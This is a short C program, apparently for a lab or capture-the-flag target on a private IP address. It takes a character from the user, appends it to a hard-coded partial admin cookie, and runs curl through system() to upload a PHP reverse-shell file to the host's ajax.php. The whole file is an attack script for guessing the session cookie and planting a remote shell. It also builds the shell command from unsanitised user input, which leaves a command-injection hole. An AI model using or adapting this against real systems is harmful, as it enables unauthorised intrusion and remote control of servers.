#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char alphabet[100];
    char command[500];

    printf("Enter the letter: ");
    fgets(alphabet, sizeof(alphabet), stdin);
    // Remove newline character if present
    alphabet[strcspn(alphabet, "\n")] = 0;

    snprintf(command, sizeof(command),
             "curl -k -F 'file=@./php-reverse.php' "
             "-F 'secure=val1d' --cookie 'admin=&G6u@B6uDXMq&Ms%s' "
             "http://192.168.43.153/ajax.php", alphabet);

    printf("Executing command: %s\n", command);
    system(command);

    return 0;
}

